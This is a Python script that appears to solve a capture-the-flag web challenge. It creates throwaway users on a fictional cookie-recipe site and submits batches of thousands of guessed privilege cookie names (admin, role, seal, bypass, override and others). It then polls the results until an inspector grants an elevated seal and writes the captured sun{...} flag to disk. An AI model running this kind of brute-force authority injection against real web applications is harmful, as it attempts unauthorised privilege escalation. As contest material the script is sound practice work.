#!/usr/bin/env python3
"""Finish the cookie-name axis: the ~2300 names my earlier sweep cut off.

`name_sweep2.py` generated 2,922 candidate cookie names and then kept only the first two
chunks of 290, so 580 names were tested and the log says so. The mixer lets a single batch
carry ~290 cookies, so the rest is 8 more batches, not 2300. Two value sets (the authority
string and a truthy string) over the remaining names, each batch staying under 12 KB of
cookies so the inspector actually stamps it - an unsealed batch would tell me nothing about
whether a name works.
"""
import re
import sys
import time

from cc import new_baker

ROOTS = """role user_role userrole roles usertype type kind level tier rank group staff
admin isadmin is_admin permission permissions privilege privileges clearance authority auth
seal seallevel seal_level sealtype golden gold goldseal golden_seal chief headchief
head_chief thechief the_chief chef inspector inspector_role quality_inspector supervisor
foreman manager director owner boss ceo founder president baker master grandmaster legend
legendary approved certified verified trusted internal privileged override bypass debug dev
mode review review_level reviewlevel reviewer verdict decision outcome stamped sealed
status state badge token sess session csrf signature hmac apikey api_key secret salt
mixer drum tray dough batch recipe ingredient cookie cookies cc cookiecorp orbital sector
city moon sugar sprinkles star dust solar cosmic quantum plasma gravity comet vanilla
cocoa honey who actor principal identity sub iss aud xr ccrole cc_role ccseal clevel
x_role xrole xlevel x-seal xseal priority scope grant granted reviewer_role reviewed_by
sealed_by sealedby approved_by approvedby stamp_level authority_level inspector_key
chief_key seal_key golden_key magic secret_word passphrase passphrase_value yes no null
undefined nan inf infinity true false zero one admin_only staff_only internal_only""".split()
PREFIXES = ["", "cc_", "cc-", "x_", "cookiecorp_", "cookie_"]
CHUNK = 290


def names():
    out, seen = [], set()
    for p in PREFIXES:
        for r in ROOTS:
            for cand in (p + r, p + r.replace("_", "-"), p + r.replace("_", "")):
                for c in (cand, cand.upper(), cand.capitalize()):
                    if c and c not in seen and len(c) <= 40:
                        seen.add(c)
                        out.append(c)
    return out


def log(*a):
    sys.stdout.buffer.write(("[%s] " % time.strftime("%H:%M:%S") + " ".join(str(x) for x in a)
                             + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def cell(c, rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash or "", re.S)
    if not blk:
        return "norow", "?"
    b = blk.group(0)
    st = re.search(r'class="pill (\w+)">(\w+)</span>', b)
    tail = " ".join(re.sub(r"<[^>]+>", " ", b.split("</span>")[-1]).split())
    return ("NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:26]),
            st.group(2) if st else "?")


ALL = names()
chunks = [ALL[i:i + CHUNK] for i in range(0, len(ALL), CHUNK)]
log("names %d in %d chunks; sweeping chunks 2.. from the previous run" % (len(ALL), len(chunks)))

u, c, _ = new_baker("nz")
made = 0
for ci, chunk in enumerate(chunks):
    if ci < 2:
        continue
    for vname, val in (("chief", "chief"), ("true", "true")):
        if made >= 8:
            u, c, _ = new_baker("nz")
            made = 0
            log("new user %s" % u)
        ings, used, total = [], set(), 0
        for n in chunk:
            if n in used:
                continue
            if total + len(n) + 1 + len(val) + 2 > 12200:
                break
            used.add(n)
            ings.append({"name": n, "value": val})
            total += len(n) + 1 + len(val) + 2
        code, out, dt = c.post("/api/recipe", {"title": "c%d-%s" % (ci, vname), "ingredients": ings})
        rid = out.get("id") if isinstance(out, dict) else None
        if not rid:
            log("  c%d-%s save -> %s %s" % (ci, vname, code, str(out)[:60]))
            continue
        made += 1
        for k in range(12):
            sc, so, _ = c.post("/api/recipe/%s/submit" % rid, {})
            if isinstance(so, dict) and so.get("ok"):
                break
            time.sleep(7)
        seal = stt = "?"
        for k in range(16):
            time.sleep(5)
            seal, stt = cell(c, rid)
            if stt == "reviewed":
                break
        log("  chunk%-2d %-6s %3d cookies %6dB -> %-9s %s" % (ci, vname, len(ings), total, stt, seal))
        if seal not in ("standard", "NONE"):
            code, page, _ = c.get("/recipe/%s" % rid)
            open("../files/golden_name3_%d_%s.html" % (ci, vname), "w",
                 encoding="utf-8").write(str(page))
            fl = re.findall(r"sun\{[^{}\r\n]{1,200}\}", str(page))
            log("      !!! %s -> %s %s" % (vname, seal, fl))
            if fl:
                open("../flag.txt", "w", encoding="utf-8").write(fl[0] + "\n")
                sys.exit(0)
log("name axis complete")
